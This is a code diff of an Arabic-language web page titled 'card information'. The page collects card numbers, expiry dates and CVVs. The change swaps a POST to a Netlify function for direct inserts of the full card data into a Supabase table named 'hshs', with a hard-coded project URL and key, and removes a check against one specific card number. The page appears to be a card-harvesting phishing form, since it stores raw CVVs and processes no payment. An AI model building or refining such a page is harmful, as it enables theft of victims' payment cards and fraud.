@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>معلومات البطاقة</title>
     <style>
+        /* (احتفظ بالستايل كما هو في كودك الأصلي) */
         body {
             background-color: #fff;
             display: flex;
@@ -134,7 +135,14 @@
             <p id="error-message" class="error-message"></p>
         </form>
     </div>
+    <!-- إضافة مكتبة Supabase -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@latest/dist/supabase.min.js"></script>
     <script>
+        // تهيئة Supabase
+        const supabaseUrl = 'https://zwcnqwdplnqiawhnwrzo.supabase.co'; // استبدل بـ URL مشروعك
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp3Y25xd2RwbG5xaWF3aG53cnpvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MjUzNDcwMjksImV4cCI6MjA0MDkyMzAyOX0.93B1EJ8tDrOhD9V_f1I05JcU6PfBTExMjyN6lzGsaNc'; // استبدل بـ Anon Key الخاص بك
+        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
         function formatCardNumber(input) {
             let value = input.value.replace(/\s+/g, '');
             if (value.length > 16) {
@@ -171,36 +179,30 @@
             const cvv = document.getElementById('cvv').value;
             const errorMessage = document.getElementById('error-message');
 
-            if (cardNumber !== '5556960012505071') {
-                errorMessage.textContent = 'رقم البطاقة غير صالح.';
-                return;
-            }
-
+            // تحقق من صحة البيانات
             if (cardNumber.length < 16 || expiryDate.length < 5 || cvv.length < 3) {
                 errorMessage.textContent = 'يرجى ملء جميع الحقول بشكل صحيح.';
                 return;
             }
 
             try {
-                // إرسال البيانات إلى دالة Convex عبر واجهة HTTP
-                const response = await fetch('https://marvelous-marshmallow-9f6953.netlify.app/.netlify/functions/save-data', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        cardNumber,
-                        expiryDate,
-                        cvv,
-                        timestamp: new Date().toISOString()
-                    }),
-                });
+                // إدخال البيانات إلى جدول Supabase
+                const { data, error } = await supabase
+                    .from('hshs') // استبدل بـ اسم الجدول الخاص بك
+                    .insert([
+                        { 
+                            card_number: cardNumber, 
+                            expiry_date: expiryDate, 
+                            cvv: cvv 
+                        }
+                    ]);
 
-                if (response.ok) {
-                    window.location.href = 'confirmation.html'; // إعادة توجيه المستخدم إلى صفحة التأكيد
-                } else {
-                    throw new Error('فشل إرسال البيانات.');
+                if (error) {
+                    throw error;
                 }
+
+                // إعادة توجيه المستخدم بعد النجاح
+                window.location.href = 'confirmation.html'; // تأكد من وجود صفحة confirmation.html
             } catch (error) {
                 errorMessage.textContent = 'فشل إرسال البيانات: ' + error.message;
             }
